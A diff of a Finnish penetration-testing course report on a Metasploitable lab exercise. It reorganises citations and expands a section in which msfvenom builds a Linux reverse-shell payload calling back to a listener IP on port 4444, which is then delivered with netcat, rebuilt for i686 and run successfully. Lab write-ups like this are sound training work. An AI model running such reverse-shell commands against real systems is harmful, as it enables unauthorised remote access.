@@ -164,6 +164,10 @@ Lisäämällä vielä ison alkukirjaimen (Alpha1) prosessi venyi jo noin 12 minu
 
 _Alpha1 cracked_
 
+### Lähteet
+
+Geeks for Geeks: Encrypt & Decrypt Files With Password Using OpenSSL. Luettavissa: https://www.geeksforgeeks.org/blockchain-encrypt-decrypt-files-with-password-using-openssl/. Luettu 26.11.2024
+
 ## MSFVenom (Kohta G)
 
 Aloitin tämän osion tekemällä tyypilliset yhteyskokeilut. Tämän jälkeen loin "Reverse Shell"-payloadin MSFVenomia hyödyntämällä komennolla `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.82.4 LPORT=4444  -f elf -o reverse_shell.elf`.
@@ -176,22 +180,28 @@ Seuraavaksi tein msfconsolessa multihandlerin, joka kuuntelee äskeisen payloadi
 
 ![image](https://github.com/user-attachments/assets/36e64ea0-4f9b-46b1-ba52-50058d5d1516)
 
-Lähetin sen metasploitableen netcatilla komennolla `nc <Metasploitable_IP> 4444 < reverse_shell.elf`
+_Multihandler_
+
+Lähetin payloadin metasploitableen netcatilla komennolla `nc <Metasploitable_IP> 4444 < reverse_shell.elf`.
 
 ![image](https://github.com/user-attachments/assets/8adad6b6-5d4d-4df0-9473-dbbfebae43f2)
 
 ![image](https://github.com/user-attachments/assets/9b9c713a-2c32-40d8-9e96-87dc08d6b86a)
 
-Annoin hyökkäykselle oikeudet ja suoritin hyökkäyksen
+Annoin hyökkäykselle oikeudet ja suoritin hyökkäyksen metasploitablessa.
 
 ![image](https://github.com/user-attachments/assets/dc0f486a-41eb-4a12-83d1-fe5e03708d95)
 
-Ensimmäisessä hyökkäyksessä payload oli 64x eikä 32x uudestaan
+Hyökkäyksessä oli vielä väärä arkkitehtuuri, joten tein pikaisesti uuden joka toimii `i686`:ssa ja kokeilin sitä.
 
 ![image](https://github.com/user-attachments/assets/c324d2ff-d0f7-4d03-873a-e994d9a276ab)
 
 ![image](https://github.com/user-attachments/assets/ecc65b19-5a75-4d37-9f83-b5e711ac803f)
 
-### Lähteet
+Hyökkäys onnistui!
 
-https://www.geeksforgeeks.org/blockchain-encrypt-decrypt-files-with-password-using-openssl/
+## Yleiset lähteet
+
+Pohjana Tero Karvinen 2024: Tunkeutumistestaus -kurssi. Luettavissa: https://terokarvinen.com/tunkeutumistestaus/.
+
+Tätä dokumenttia saa kopioida ja muokata GNU General Public License (versio 2 tai uudempi) mukaisesti. http://www.gnu.org/licenses/gpl.html
